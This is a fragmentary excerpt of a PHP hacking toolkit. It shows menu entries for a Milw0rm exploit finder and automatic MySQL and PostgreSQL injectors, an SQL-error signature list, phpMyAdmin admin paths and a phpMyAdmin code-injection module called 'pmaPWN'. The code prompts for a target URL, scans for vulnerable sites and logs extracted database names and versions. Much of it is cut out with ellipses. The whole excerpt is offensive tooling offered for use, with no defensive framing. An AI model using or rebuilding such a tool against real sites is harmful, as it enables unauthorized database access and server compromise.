...
$text .= "| Pelican_Exploit          | Milw0rm Pelican_Exploit Finder                               |\n";
$text .= "| injector         | Automatic MySQL Injector, work for v4 and v5         |\n";
$text .= "| Pelican_Db_Postgresql       | Automatic PostgreSQL Injector                        |\n";
...
function sql($site = '', $full = '0')
{
    $sql_error = array(
        ...
        'Microsoft JET Db','ODBC Microsoft Access Driver',
...
based on Bugs Pelican_Exploit Finder V 1.0 2010 by DDOS
James@hotmail.fr
Milw0rm Exploits Finder  V 0.1
*/
function Pelican_Exploit()
{
...
$d=$i+1;
print "\n";
print "[+] Pelican_Exploit Number : $d \n";
save_log('exploits.log', "[+]Exploit Number : $d \r\n");
print "[+] Pelican_Exploit Name = ".$exploit[1][$i]."\n";
save_log('exploits.log', "[+]Exploit Name = ".$exploit[1][$i]."\r\n");
print "[+] Pelican_Exploit URL  = http://www.milw0rm.com".$url[1][$i]."\r\n";
save_log('exploits.log', "[+]Exploit URL  = http://www.milw0rm.com".$url[1][$i]."\r\n");
print "[+] Pelican_Exploit Date = ".$date[1][$i]."\n";
...
'/mysql-admin/',
        ...
        print "\n[!] pmaPWN! - phpMyAdmin Code Injection Pelican_Exploit(PHP) by d3ck4\n\n";
        print "[-] Site : ".$site."\n";
...
function Pelican_Db_Postgresql()
{
fwrite(STDOUT, "\n-URL: ");
$url = trim(fgets(STDIN));
fwrite(STDOUT, "\n-Quote(if need): ");
...
echo "[-] Db: ".$data[2]."\n";
save_log('postgresql.txt', "[-] Db: ".$data[2]."\r\n");
echo "[-] Version: ".$data[3]."\n";
